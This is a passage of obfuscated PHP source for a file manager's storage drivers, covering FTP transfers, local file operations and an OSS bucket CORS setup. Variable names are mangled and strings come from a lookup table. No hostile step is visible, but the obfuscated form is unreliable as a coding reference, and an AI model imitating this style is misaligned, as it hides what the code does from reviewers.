$this->fileList($Ô¯‹¡øÜ, $ÆûÅü‹ò, $Ã…ƒÛüê, $¡ïÑ®›¾); if ($¨Øô½äå) { return array($ß—ı©šÓ[207] => count($Ã…ƒÛüê), $ß—ı©šÓ[208] => count($ÆûÅü‹ò)); } if ($¼ë´ğ Ş) { if (count($Ã…ƒÛüê)) { return !0; } } else { if (count($ÆûÅü‹ò)) { return !0; } } return !1; } public function listAll($çÇÄ¹É¸) { $æÍ¶È’ =& $_SERVER[ì™ı‰º¯]; if (!$this->_isconn()) { return !1; } $­§”±Ú = $éä¬åÇ¨ = array(); $this->fileList($çÇÄ¹É¸, $­§”±Ú, $éä¬åÇ¨, !0); $Šù«¯Àö = array_to_keyvalue($éä¬åÇ¨, $æÍ¶È’[32]); foreach ($­§”±Ú as $Š»ØÖ·º) { if (is_string($Š»ØÖ·º)) { $Šù«¯Àö[$Š»ØÖ·º] = array($æÍ¶È’[76] => 0); } } return $this->listAllFiles($çÇÄ¹É¸, $Šù«¯Àö); } public function getContent($òŒ‘Äªœ) { if (!$this->_isconn()) { return !1; } $òŒ‘Äªœ = $this->iconvSystem($òŒ‘Äªœ); return $this->fileSubstr($òŒ‘Äªœ); } public function setContent($åİÕøî, $ùÓÊ»úé = '') { if (!$this->_isconn()) { return !1; } $¯Êõú“î = $this->pathThis($this->iconvSystem($åİÕøî)); $ÃÄÃ¥ÏÍ = $this->tempFile($¯Êõú“î); file_put_contents($ÃÄÃ¥ÏÍ, $ùÓÊ»úé); $ñô¢´íÌ = $this->upload($åİÕøî, $this->iconvApp($ÃÄÃ¥ÏÍ)); $this->tempFileRemve($ÃÄÃ¥ÏÍ); return $ñô¢´íÌ; } public function fileSubstr($şè Ÿº­, $‹Ë”ê¿¡ = 0, $®òÑ¿æŸ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($şè Ÿº­, $‹Ë”ê¿¡, $®òÑ¿æŸ); } private function ftpRequest($š½ÆĞ¿ğ, $‹Ú²æôƒ = 0, $é‘ÍÓ± = false) { $š½ÆĞ¿ğ = $this->iconvSystem($š½ÆĞ¿ğ); $ü´æØó¹ = $this->scheme . $this->host . $_SERVER[ì™ı‰º¯][4] . $this->port; $¼Âß¥ = curl_init(); curl_setopt($¼Âß¥, CURLOPT_URL, $ü´æØó¹ . $this->pathEncode($š½ÆĞ¿ğ)); curl_setopt($¼Âß¥, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($é‘ÍÓ±) { $èı¶®— = $‹Ú²æôƒ + $é‘ÍÓ± - 1; curl_setopt($¼Âß¥, CURLOPT_RANGE, "{$‹Ú²æôƒ}\55{$èı¶®—}"); } curl_setopt($¼Âß¥, CURLOPT_RETURNTRANSFER, 1); $ÖãÑêÏ„ = curl_exec($¼Âß¥); curl_close($¼Âß¥); return $ÖãÑêÏ„; } public function upload($‚ÃİöÆ, $Ã½ÃÇš», $Åñ›Á’‡ = false, $í‹®‹¶ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($‚ÃİöÆ))) { return !1; } $‚ÃİöÆ = $this->iconvSystem($‚ÃİöÆ); $Ã½ÃÇš» = $this->iconvSystem($Ã½ÃÇš»); $ÉÎÌÜ“— = ftp_nb_put($this->connect, $‚ÃİöÆ, $Ã½ÃÇš», FTP_BINARY); while ($ÉÎÌÜ“— == FTP_MOREDATA) { $ÉÎÌÜ“— = ftp_nb_continue($this->connect); } if ($ÉÎÌÜ“— != FTP_FINISHED) { return !1; } return $this->getPathOuter($‚ÃİöÆ); } public function download($Ø¿–ØÕ, $÷ÁÇ³æğ = '') { if (!$this->_isconn()) { return !1; } $À†›Ñ• = $this->pathFather($÷ÁÇ³æğ); if (!IO::mkdir($À†›Ñ•)) { return !1; } $Ø¿–ØÕ = $this->iconvSystem($Ø¿–ØÕ); $÷ÁÇ³æğ = $this->iconvSystem($÷ÁÇ³æğ); $ŞÕ÷’æ = ftp_nb_get($this->connect, $÷ÁÇ³æğ, $Ø¿–ØÕ, FTP_BINARY); while ($ŞÕ÷’æ == FTP_MOREDATA) { $ŞÕ÷’æ = ftp_nb_continue($this->connect); } if ($ŞÕ÷’æ != FTP_FINISHED) { return !1; } return $this->iconvApp($÷ÁÇ³æğ); } public function exist($–ÛãÙ¥Š) { return $this->isFile($–ÛãÙ¥Š) || $this->isFolder($–ÛãÙ¥Š); } public function isFile($™ÌÉÓù) { return !$this->isFolder($™ÌÉÓù) && $this->objectMeta($™ÌÉÓù); } public function isFolder($°Æº§›») { return $this->cacheMethod($_SERVER[ì™ı‰º¯][165], $°Æº§›»); } protected function objectMeta($‚­îÍñÚ) { return $this->cacheMethod($_SERVER[ì™ı‰º¯][167], $‚­îÍñÚ); } protected function _objectMeta($¢¤š…Ùõ) { $·ÚºşÂ› =& $_SERVER[ì™ı‰º¯]; if ($¢¤š…Ùõ == $·ÚºşÂ›[12] || $¢¤š…Ùõ == $·ÚºşÂ›[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¢¤š…Ùõ = $this->iconvSystem($¢¤š…Ùõ); $Î¦ùæì‹ = array($·ÚºşÂ›[32] => $this->iconvApp($¢¤š…Ùõ), $·ÚºşÂ›[33] => $·ÚºşÂ›[200], $·ÚºşÂ›[76] => 0); @ftp_chdir($this->connect, $·ÚºşÂ›[8]); $Ù”·±…Æ = @ftp_size($this->connect, $¢¤š…Ùõ); if ($Ù”·±…Æ != -1) { $Î¦ùæì‹[$·ÚºşÂ›[76]] = $Ù”·±…Æ; } else { $ õ§™ÎÆ = @ftp_chdir($this->connect, $¢¤š…Ùõ); if (!$ õ§™ÎÆ) { return !1; } $Î¦ùæì‹[$·ÚºşÂ›[33]] = $·ÚºşÂ›[75]; } return $Î¦ùæì‹; } protected function _isFolder($†¶À“®ª) { $êò£««¬ =& $_SERVER[ì™ı‰º¯]; if ($†¶À“®ª == $êò£««¬[12] || $†¶À“®ª == $êò£««¬[8]) { return !0; } $“‚úÂ™‘ = $this->_objectMeta($†¶À“®ª); return isset($“‚úÂ™‘[$êò£««¬[33]]) && $“‚úÂ™‘[$êò£««¬[33]] == $êò£««¬[75] ? !0 : !1; } } goto b¬àå‘Œæ; b¬àå‘Œæ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($„îÛäÓÏ) { if (substr($„îÛäÓÏ, 0, 2) == $_SERVER[ì™ı‰º¯][1378]) { $„îÛäÓÏ = BASIC_PATH . substr($„îÛäÓÏ, 2); } return $„îÛäÓÏ; } public function iconvApp($ğí¥¬±¡) { $¤Õ”Å’Â =& $_SERVER[ì™ı‰º¯]; global $config; return $this->iconvTo($ğí¥¬±¡, $config[$¤Õ”Å’Â[1376]], $config[$¤Õ”Å’Â[1375]]); } public function iconvSystem($·°Éê) { $½‹”ûéƒ =& $_SERVER[ì™ı‰º¯]; global $config; return $this->iconvTo($·°Éê, $config[$½‹”ûéƒ[1375]], $config[$½‹”ûéƒ[1376]]); } public function getPathOuter($¶¯ù°¦) { $íäå›Ì =& $_SERVER[ì™ı‰º¯]; $ùÀÍ†ø = $this->iconvApp($this->pathBase); $¶¯ù°¦ = $this->iconvApp($¶¯ù°¦); if (substr($ùÀÍ†ø, 0, 2) == $íäå›Ì[1378]) { $ùÀÍ†ø = BASIC_PATH . substr($ùÀÍ†ø, 2); } if (substr($¶¯ù°¦, 0, 2) == $íäå›Ì[1378]) { $¶¯ù°¦ = BASIC_PATH . substr($¶¯ù°¦, 2); } $ùÀÍ†ø = KodIO::clear($ùÀÍ†ø); $¶¯ù°¦ = KodIO::clear($¶¯ù°¦); $¶¯ù°¦ = substr($¶¯ù°¦, strlen($ùÀÍ†ø)); if (empty($this->pathDriver)) { return $¶¯ù°¦; } return $this->pathDriver . $íäå›Ì[8] . ltrim($¶¯ù°¦, $íäå›Ì[8]); } public function mkfile($ûàÀğ¡Æ, $ßŞ°©¸æ = '', $×¹´Ğ“ = REPEAT_RENAME) { $ûàÀğ¡Æ = $this->iconvSystem($ûàÀğ¡Æ); @touch($ûàÀğ¡Æ); if ($ßŞ°©¸æ) { file_put_contents($ûàÀğ¡Æ, $ßŞ°©¸æ); } @chmod($ûàÀğ¡Æ, $this->pathAuth); return is_file($ûàÀğ¡Æ) ? $this->getPathOuter($ûàÀğ¡Æ) : !1; } public function mkdir($š×©¦ıµ, $ŠÍù× = REPEAT_SKIP) { $š×©¦ıµ = $this->iconvSystem($š×©¦ıµ); if (is_dir($š×©¦ıµ)) { return $this->getPathOuter($š×©¦ıµ); } @mkdir($š×©¦ıµ, $this->pathAuth, !0); @chmod($š×©¦ıµ, $this->pathAuth); return is_dir($š×©¦ıµ) ? $this->getPathOuter($š×©¦ıµ) : !1; } public function copyFile($Šœ©¥Æª, $Æ÷†òù) { $this->mkdir($this->pathFather($Æ÷†òù)); $Šœ©¥Æª = $this->iconvSystem($Šœ©¥Æª); $Æ÷†òù = $this->iconvSystem($Æ÷†òù); $ĞŒ‹äÄí = copy_64($Šœ©¥Æª, $Æ÷†òù); @chmod($Æ÷†òù, $this->pathAuth); return $ĞŒ‹äÄí ? $this->getPathOuter($Æ÷†òù) : !1; } public function moveFile($ùÆœù‘”, $ù¥Î±ƒº) { $this->mkdir($this->pathFather($ù¥Î±ƒº)); $ùÆœù‘” = $this->iconvSystem($ùÆœù‘”); $ù¥Î±ƒº = $this->iconvSystem($ù¥Î±ƒº); $ƒ³ìÂâƒ = intval(@rename($ùÆœù‘”, $ù¥Î±ƒº)); if (!$ƒ³ìÂâƒ) { if ($ƒ³ìÂâƒ = intval(@copy_64($ùÆœù‘”, $ù¥Î±ƒº))) { @unlink($ùÆœù‘”); } } @chmod($ù¥Î±ƒº, $this->pathAuth); return $ƒ³ìÂâƒ ? $this->getPathOuter($ù¥Î±ƒº) : !1; } public function movePath($§™¶Îë¥, $ä¶ë«ëã, $˜©Ø¨ıÛ = false) { $ƒ±áˆˆ´ =& $_SERVER[ì™ı‰º¯]; $§™¶Îë¥ = $this->iconvSystem($§™¶Îë¥); $ä¶ë«ëã = $this->iconvSystem($ä¶ë«ëã); $×½±¯´½ = rtrim($ä¶ë«ëã, $ƒ±áˆˆ´[8]) . $ƒ±áˆˆ´[8] . ($˜©Ø¨ıÛ ? $˜©Ø¨ıÛ : get_path_this($§™¶Îë¥)); if (file_exists($×½±¯´½)) { return !1; } $ãæïˆÉ› = intval(@rename($§™¶Îë¥, $×½±¯´½)); $ãæïˆÉ› = file_exists($×½±¯´½); return $ãæïˆÉ› ? $this->getPathOuter($×½±¯´½) : !1; } public function delFile($šèÊ’¾¤) { $šèÊ’¾¤ = $this->iconvSystem($šèÊ’¾¤); if (!@unlink($šèÊ’¾¤)) { @chmod($šèÊ’¾¤, $this->pathAuth); if (!@unlink($šèÊ’¾¤)) { return !1; } } else { return !0; } } public function delFolder($ÑÈÙ¿°Ó) { $ÛÙ“¸Ş =& $_SERVER[ì™ı‰º¯]; $ÑÈÙ¿°Ó = $this->iconvSystem($ÑÈÙ¿°Ó); if (!is_dir($ÑÈÙ¿°Ó)) { return !0; } if (!($¼ÛÈ”ôĞ = opendir($ÑÈÙ¿°Ó))) { return !1; } while (($çŸ·«‹— = readdir($¼ÛÈ”ôĞ)) !== !1) { if ($çŸ·«‹— == $ÛÙ“¸Ş[10] || $çŸ·«‹— == $ÛÙ“¸Ş[1385]) { continue; } $œ½ ü˜  = $ÑÈÙ¿°Ó . $ÛÙ“¸Ş[8] . $çŸ·«‹—; if (is_file($œ½ ü˜ ) || is_link($œ½ ü˜ )) { if (!unlink($œ½ ü˜ )) { chmod($œ½ ü˜ , $this->pathAuth); if (!unlink($œ½ ü˜ )) { return !1; } } } else { if (is_dir($œ½ ü˜ )) { chmod($œ½ ü˜ , $this->pathAuth); $œ½ ü˜  = $this->iconvApp($œ½ ü˜ ); if (!$this->delFolder($œ½ ü˜ )) { return !1; } } } } closedir($¼ÛÈ”ôĞ); return rmdir($ÑÈÙ¿°Ó); } public function rename($–»¬‰¡–, $¶Š±¨êÀ) { $åàöÅã =& $_SERVER[ì™ı‰º¯]; $šº‡¾“ = $this->fileNameAuto($this->pathFather($–»¬‰¡–), $¶Š±¨êÀ); $šº‡¾“ = $this->iconvSystem($šº‡¾“); $–»¬‰¡– = $this->iconvSystem($–»¬‰¡–); $‘¢æ¬ğ’ = $this->pathFather($–»¬‰¡–); $ì×”ô«İ = rtrim($‘¢æ¬ğ’, $åàöÅã[8]) . $åàöÅã[8] . $šº‡¾“; $ªüĞ”·Â = @rename($–»¬‰¡–, $ì×”ô«İ); $ì×”ô«İ = $this->iconvApp($ì×”ô«İ); return $ªüĞ”·Â ? $this->getPathOuter($ì×”ô«İ) : !1; } public function size($˜¿É¢³Ú) { $˜¿É¢³Ú = $this->iconvSystem($˜¿É¢³Ú); return filesize_64($˜¿É¢³Ú); } public function info($œ¨œì¸ú) { $œ¨œì¸ú = $this->iconvSystem($œ¨œì¸ú); if ($this->isFolder($œ¨œì¸ú)) { return $this->folderInfo($œ¨œì¸ú); } else { if ($this->isFile($œ¨œì¸ú)) { return $this->fileInfo($œ¨œì¸ú); } } return !1; } protected function infoChildren($õªßèã, &$÷ö¸óÉ¾, $¸ì¦™Óû = true) { $Í•à¦‘ =& $_SERVER[ì™ı‰º¯]; check_abort_echo(); $õªßèã = rtrim($õªßèã, $Í•à¦‘[8]) . $Í•à¦‘[8]; if ($¸ì¦™Óû) { $õªßèã = $this->iconvSystem($õªßèã); } if (!($ÊÀµ³ßà = @opendir($õªßèã))) { return; } while (($£Ğ¥‰æ§ = readdir($ÊÀµ³ßà)) !== !1) { if ($£Ğ¥‰æ§ == $Í•à¦‘[10] || $£Ğ¥‰æ§ == $Í•à¦‘[1385]) { continue; } $÷¶•ÈèÂ = $õªßèã . $£Ğ¥‰æ§; if (is_file($÷¶•ÈèÂ) || is_link($÷¶•ÈèÂ)) { $÷ö¸óÉ¾[$Í•à¦‘[77]]++; $÷ö¸óÉ¾[$Í•à¦‘[76]] += filesize_64($÷¶•ÈèÂ); } else { if (is_dir($÷¶•ÈèÂ)) { $÷ö¸óÉ¾[$Í•à¦‘[78]]++; $this->infoChildren($÷¶•ÈèÂ, $÷ö¸óÉ¾, !1); } } } closedir($ÊÀµ³ßà); } private function folderInfo($á†Ï±ª, $íºŒîû¬ = false) { $˜¼¿™øÌ =& $_SERVER[ì™ı‰º¯]; $á†Ï±ª = rtrim($á†Ï±ª, $˜¼¿™øÌ[8]) . $˜¼¿™øÌ[8]; $Èè¸ºóà = $this->iconvApp($this->pathThis($á†Ï±ª)); if ($íºŒîû¬) { return array($˜¼¿™øÌ[32] => $Èè¸ºóà, $˜¼¿™øÌ[84] => $this->getPathOuter($á†Ï±ª), $˜¼¿™øÌ[33] => $˜¼¿™øÌ[75]); } $ì³À¸¼ = array($˜¼¿™øÌ[32] => $Èè¸ºóà, $˜¼¿™øÌ[84] => $this->getPathOuter($á†Ï±ª), $˜¼¿™øÌ[33] => $˜¼¿™øÌ[75], $˜¼¿™øÌ[201] => @filectime($á†Ï±ª), $˜¼¿™øÌ[85] => @filemtime($á†Ï±ª), $˜¼¿™øÌ[1388] => @fileatime($á†Ï±ª), $˜¼¿™øÌ[1389] => is_readable($á†Ï±ª), $˜¼¿™øÌ[1390] => is_writable($á†Ï±ª), $˜¼¿™øÌ[1391] => get_mode($á†Ï±ª)); return $ì³À¸¼; } private function fileInfo($»Ì–¢È, $Ê£î£‹é = false) { $ú¾úš´¤ =& $_SERVER[ì™ı‰º¯]; $Ê¯ø†² = $this->iconvApp($this->pathThis($»Ì–¢È)); if ($Ê£î£‹é) { return array($ú¾úš´¤[32] => $Ê¯ø†², $ú¾úš´¤[84] => $this->getPathOuter($»Ì–¢È), $ú¾úš´¤[33] => $ú¾úš´¤[200], $ú¾úš´¤[76] => $this->size($»Ì–¢È), $ú¾úš´¤[174] => $this->ext($Ê¯ø†²)); } $–  ³õ± = array($ú¾úš´¤[32] => $Ê¯ø†², $ú¾úš´¤[84] => $this->getPathOuter($»Ì–¢È), $ú¾úš´¤[33] => $ú¾úš´¤[200], $ú¾úš´¤[201] => @filectime($»Ì–¢È), $ú¾úš´¤[85] => @filemtime($»Ì–¢È), $ú¾úš´¤[1388] => @fileatime($»Ì–¢È), $ú¾úš´¤[76] => $this->size($»Ì–¢È), $ú¾úš´¤[174] => $this->ext($Ê¯ø†²), $ú¾úš´¤[1389] => is_readable($»Ì–¢È), $ú¾úš´¤[1390] => is_writable($»Ì–¢È), $ú¾úš´¤[1391] => get_mode($»Ì–¢È)); return $–  ³õ±; } public function exist($˜ñª¡ââ) { $˜ñª¡ââ = $this->iconvSystem($˜ñª¡ââ); return @file_exists($˜ñª¡ââ); } public function isFile($œôÃöåè) { $œôÃöåè = $this->iconvSystem($œôÃöåè); return @is_file($œôÃöåè); } public function isFolder($®ëé¸º±) { $®ëé¸º± = $this->iconvSystem($®ëé¸º±); return @is_dir($®ëé¸º±); } public function listPath($‘¢ö¢·Ñ, $Ï®ÀˆœØ = false) { $”ŒÊÄÈÁ =& $_SERVER[ì™ı‰º¯]; $‘¢ö¢·Ñ = $this->iconvSystem($‘¢ö¢·Ñ); $‘¢ö¢·Ñ = rtrim($‘¢ö¢·Ñ, $”ŒÊÄÈÁ[8]) . $”ŒÊÄÈÁ[8]; $œŠøÑë© = array($”ŒÊÄÈÁ[82] => array(), $”ŒÊÄÈÁ[83] => array()); if (!($”¾ô¢îÓ = @opendir($‘¢ö¢·Ñ))) { return $œŠøÑë©; } while (($’ª‡İö’ = readdir($”¾ô¢îÓ)) !== !1) { if ($’ª‡İö’ == $”ŒÊÄÈÁ[10] || $’ª‡İö’ == $”ŒÊÄÈÁ[1385]) { continue; } $ıš–Û”° = $‘¢ö¢·Ñ . $’ª‡İö’; if (is_file($ıš–Û”°)) { $œŠøÑë©[$”ŒÊÄÈÁ[83]][] = $this->fileInfo($ıš–Û”°, $Ï®ÀˆœØ); } else { $œŠøÑë©[$”ŒÊÄÈÁ[82]][] = $this->folderInfo($ıš–Û”°, $Ï®ÀˆœØ); } } closedir($”¾ô¢îÓ); return $œŠøÑë©; } public function listAll($‡¡‘ØÂ¥, &$æ¶ö´µÊ = array()) { $ì¼ÈéÅˆ =& $_SERVER[ì™ı‰º¯]; $‡¡‘ØÂ¥ = $this->iconvSystem($‡¡‘ØÂ¥); $‡¡‘ØÂ¥ = rtrim($‡¡‘ØÂ¥, $ì¼ÈéÅˆ[8]) . $ì¼ÈéÅˆ[8]; if (!($ü«“€š¸ = @opendir($‡¡‘ØÂ¥))) { return $æ¶ö´µÊ; } while (($ò×¼„²ê = readdir($ü«“€š¸)) !== !1) { if ($ò×¼„²ê == $ì¼ÈéÅˆ[10] || $ò×¼„²ê == $ì¼ÈéÅˆ[1385]) { continue; } $—†©ÖÇğ = $‡¡‘ØÂ¥ . $ò×¼„²ê; $³‡¯àòŞ = is_dir($—†©ÖÇğ) && !is_link($—†©ÖÇğ) ? 1 : 0; $—†©ÖÇğ = $³‡¯àòŞ ? $—†©ÖÇğ . $ì¼ÈéÅˆ[8] : $—†©ÖÇğ; $æ¶ö´µÊ[] = array($ì¼ÈéÅˆ[84] => $—†©ÖÇğ, $ì¼ÈéÅˆ[75] => $³‡¯àòŞ, $ì¼ÈéÅˆ[85] => intval(@filemtime($—†©ÖÇğ)), $ì¼ÈéÅˆ[76] => $³‡¯àòŞ ? 0 : intval($this->size($—†©ÖÇğ))); if ($³‡¯àòŞ) { $this->listAll($—†©ÖÇğ, $æ¶ö´µÊ); } } closedir($ü«“€š¸); return $æ¶ö´µÊ; } public function has($¡òôËÃ, $­í‘»úª = false, $ØìÆÖèê = true) { $äâ”ÈÂ¶ =& $_SERVER[ì™ı‰º¯]; $¡òôËÃ = $this->iconvSystem($¡òôËÃ); $¡òôËÃ = rtrim($¡òôËÃ, $äâ”ÈÂ¶[8]) . $äâ”ÈÂ¶[8]; if (!($ƒ¦â¯¾° = @opendir($¡òôËÃ))) { return !1; } $ƒ±±Æäá = 0; $³óö„°È = 0; $ËşÁ±à¯ = 0; while (($õ­ëÎı = readdir($ƒ¦â¯¾°)) !== !1) { if ($õ­ëÎı == $äâ”ÈÂ¶[10] || $õ­ëÎı == $äâ”ÈÂ¶[1385]) { continue; } $’ä›ÚÁ = $¡òôËÃ . $õ­ëÎı; if ($­í‘»úª) { $ËşÁ±à¯++; if (@is_file($’ä›ÚÁ)) { $ƒ±±Æäá++; } else { $³óö„°È++; } if ($ËşÁ±à¯ > 10000) { break; } continue; } if ($ØìÆÖèê) { if (@is_file($’ä›ÚÁ)) { return !0; } } else { if (@is_dir($’ä›ÚÁ . $äâ”ÈÂ¶[8])) { return !0; } } } closedir($ƒ¦â¯¾°); if ($­í‘»úª) { return array($äâ”ÈÂ¶[207] => $ƒ±±Æäá, $äâ”ÈÂ¶[208] => $³óö„°È); } return !1; } public function hashSimple($İÜ‡¾¯Ü) { $Ø–œˆ¢€ =& $_SERVER[ì™ı‰º¯]; if (!$İÜ‡¾¯Ü) { return md5($Ø–œˆ¢€[12]); } $İÜ‡¾¯Ü = $this->iconvSystem($İÜ‡¾¯Ü); $¸ù»à§À = $this->size($İÜ‡¾¯Ü); $âØéìÇŒ = 200; $“Ùö»•Ú = 50; if ($¸ù»à§À <= $âØéìÇŒ * $“Ùö»•Ú) { return $this->hashMd5($İÜ‡¾¯Ü) . $¸ù»à§À; } $õ˜Ü“š… = $Ø–œˆ¢€[12]; $ñ¯ªÆÎ¸ = intval($¸ù»à§À / $“Ùö»•Ú); $‘·éÀ®… = fopen($İÜ‡¾¯Ü, $Ø–œˆ¢€[1392]); if (!$‘·éÀ®…) { return $õ˜Ü“š…; } for ($ É³·Ş­ = 0; $ É³·Ş­ < $“Ùö»•Ú; $ É³·Ş­++) { fseek_64($‘·éÀ®…, $ñ¯ªÆÎ¸ * $ É³·Ş­); $õ˜Ü“š… .= fread($‘·éÀ®…, $âØéìÇŒ); } fseek_64($‘·éÀ®…, $¸ù»à§À - $âØéìÇŒ); $õ˜Ü“š… .= fread($‘·éÀ®…, $âØéìÇŒ); fclose($‘·éÀ®…); return md5($õ˜Ü“š…) . $¸ù»à§À; } public function getContent($½ÒñáÊÛ) { $½ÒñáÊÛ = $this->iconvSystem($½ÒñáÊÛ); return file_get_contents($½ÒñáÊÛ); } public function setContent($‹ÍÊ÷¯, $ËÜËÑ¸– = '') { $‹ÍÊ÷¯ = $this->iconvSystem($‹ÍÊ÷¯); $­‰üÆåû = @file_put_contents($‹ÍÊ÷¯, $ËÜËÑ¸–, LOCK_EX); clearstatcache(); @chmod($‹ÍÊ÷¯, $this->pathAuth); return $­‰üÆåû === !1 ? !1 : !0; } public function fileSubstr($ÒÄ– æš, $­¿¿Œ²º = 0, $Ğ¼Ü€€ğ = false) { $—ã¤·Â¿ =& $_SERVER[ì™ı‰º¯]; $ÒÄ– æš = $this->iconvSystem($ÒÄ– æš); if ($Ğ¼Ü€€ğ === !1) { $Ğ¼Ü€€ğ = $this->size($ÒÄ– æš); } if ($Ğ¼Ü€€ğ <= 0) { return $—ã¤·Â¿[12]; } $ıÓñğúå = fopen($ÒÄ– æš, $—ã¤·Â¿[1392]); if (!$ıÓñğúå) { return !1; } fseek_64($ıÓñğúå, $­¿¿Œ²º); $êÒò¥İ¥ = fread($ıÓñğúå, $Ğ¼Ü€€ğ); fclose($ıÓñğúå); return $êÒò¥İ¥; } public function upload($¹—‚ÊÁœ, $¥£‹œãŒ, $³¤´­± = false, $¥¹¥·ÙÎ = REPEAT_REPLACE) { if ($³¤´­±) { return $this->moveFile($¥£‹œãŒ, $¹—‚ÊÁœ); } return $this->copyFile($¥£‹œãŒ, $¹—‚ÊÁœ); } public function setModifyTime($âø÷ëå, $Ö ‹÷ù— = '') { @touch($âø÷ëå, intval($Ö ‹÷ù—)); } public function download($ÕÊ±Ñ¹, $È ëÀ£Ö) { return $this->iconvSystem($ÕÊ±Ñ¹); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($êœƒôÅø) { parent::__construct($êœƒôÅø); $this->signatureVersion($_SERVER[ì™ı‰º¯][216]); } public function fileOutLink($Óê…¿Øú) { $ŠÔˆ­“¿ =& $_SERVER[ì™ı‰º¯]; if (substr($Óê…¿Øú, 0, 7) == $ŠÔˆ­“¿[1336]) { $Óê…¿Øú = $ŠÔˆ­“¿[1337] . substr($Óê…¿Øú, 7); } header($ŠÔˆ­“¿[161] . $Óê…¿Øú); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($¸éò²Ù›) { parent::__construct(); include_once SDK_DIR . $_SERVER[ì™ı‰º¯][1393]; $this->_init($¸éò²Ù›); } public function _init($ê—òÈïù) { $şŞÖò»” =& $_SERVER[ì™ı‰º¯]; $this->config = $ê—òÈïù; foreach ($ê—òÈïù as $ØÑ½ƒ¶„ => $¯ƒˆ„éÀ) { if (isset($this->{$ØÑ½ƒ¶„})) { $this->{$ØÑ½ƒ¶„} = $¯ƒˆ„éÀ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($şŞÖò»”[1394] . LNG($şŞÖò»”[1395])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $áŞæ©Ê =& $_SERVER[ì™ı‰º¯]; $—Š‡Ò = new OSS\Model\CorsConfig(); $şï­¿¾ = new OSS\Model\CorsRule(); $şï­¿¾->addAllowedOrigin($áŞæ©Ê[1396]); $şï­¿¾->addAllowedMethod($áŞæ©Ê[1397]); $şï­¿¾->addAllowedMethod($áŞæ©Ê[1398]); $şï­¿¾->addAllowedMethod($áŞæ©Ê[1399]); $şï­¿¾->addAllowedMethod($áŞæ©Ê[1400]); $şï­¿¾->addAllowedMethod($áŞæ©Ê[160]); $şï­¿¾->setMaxAgeSeconds(600); $şï­¿¾->addExposeHeader($áŞæ©Ê[1401]); $şï­¿¾->addAllowedHeader($áŞæ©Ê[1396]); $—Š‡Ò->addRule($şï­¿¾); try { $this->client->putBucketCors($this->bucket, $—Š‡Ò); } catch (OSS\Core\OssException $‡àûŞŠ—) { return !1; } return !0; } public function getBucketCors() { $•¯Ö¢ø‰ =& $_SERVER[ì™ı‰º¯]; $Ù×áÈ ” = null; try { $Ù×áÈ ” = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¶™Ûò„•) { return null; } if (!$Ù×áÈ ” || !($‰†«ü—‡ = $Ù×áÈ ”->getRules())) { return null; } $Ü©êÊ« = $‰†«ü—‡[0]->getAllowedOrigins(); $ôû¥üº = $‰†«ü—‡[0]->getAllowedMethods(); $¼ŸœœãĞ = $‰†«ü—‡[0]->getMaxAgeSeconds(); $¢õ¤œÍ = $‰†«ü—‡[0]->getExposeHeaders(); $¨©ô²ÖÄ = $‰†«ü—‡[0]->getAllowedHeaders(); return array($•¯Ö¢ø‰[188] => isset($Ü©êÊ«[0]) ? $Ü©êÊ«[0] : $•¯Ö¢ø‰[12], $•¯Ö¢ø‰[192] => $ôû¥üº, $•¯Ö¢ø‰[1402] => $¼ŸœœãĞ, $•¯Ö¢ø‰[1403] => isset($¢õ¤œÍ[0]) ? $¢õ¤œÍ[0] : $•¯Ö¢ø‰[12], $•¯Ö¢ø‰[190] => isset($¨©ô²ÖÄ[0]) ? $¨©ô²ÖÄ[0] : $•¯Ö¢ø‰[12]); } public function isBucketCors() { $ï¬÷¿­¾ =& $_SERVER[ì™ı‰º¯]; $ù×ÏÍŸ” = $this->getBucketCors(); if (!$ù×ÏÍŸ” || !is_array($ù×ÏÍŸ”)) { return !1; } if ($ù×ÏÍŸ”[$ï¬÷¿­¾[188]] != $ï¬÷¿­¾[189] || $ù×ÏÍŸ”[$ï¬÷¿­¾[190]] != $ï¬÷¿­¾[189]) { return !1; } $Ü®‡Äß = array_map($ï¬÷¿­¾[191], $ù×ÏÍŸ”[$ï¬÷¿­¾[192]]); if (!is_array($Ü®‡Äß)) { $Ü®‡Äß = array(); } $Ò­ß÷‘î = array($ï¬÷¿­¾[193], $ï¬÷¿­¾[194], $ï¬÷¿­¾[195], $ï¬÷¿­¾[196], $ï¬÷¿­¾[197]); $°¯ÄĞ™ƒ = array_diff($Ò­ß÷‘î, $Ü®‡Äß); return empty($°¯ÄĞ™ƒ); } public function mkfile($è•½£ùå, $ü§×Û‡ = '', $çÉä¥Ø¢ = REPEAT_RENAME) { $á÷¡Î ı = $this->setContent($è•½£ùå, $ü§×Û‡); if ($á÷¡Î ı !== !1) { return $this->getPathOuter($è•½£ùå); } return !1; } public function mkdir($ÈÍ‘ó±ğ, $•’Êƒ¡¨ = REPEAT_SKIP) { if ($•’Êƒ¡¨ && $this->_isFolder($ÈÍ‘ó±ğ)) { return $this->getPathOuter($ÈÍ‘ó±ğ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ÈÍ‘ó±ğ)); } catch (OSS\Core\OssException $ûÃ—œéæ) { return !1; } return $this->getPathOuter($ÈÍ‘ó±ğ); } private function fileList($ˆá³ĞÚ, $Ö˜Õ¹î¢ = '', $“¹ü‰Õ = 0) { $ÔÉ‡áÁ… =& $_SERVER[ì™ı‰º¯]; $ˆá³ĞÚ = trim($ˆá³ĞÚ, $ÔÉ‡áÁ…[8]); $ÓĞ—‰™ = empty($ˆá³ĞÚ) && $ˆá³ĞÚ !== $ÔÉ‡áÁ…[198] ? $ÔÉ‡áÁ…[12] : $ˆá³ĞÚ . 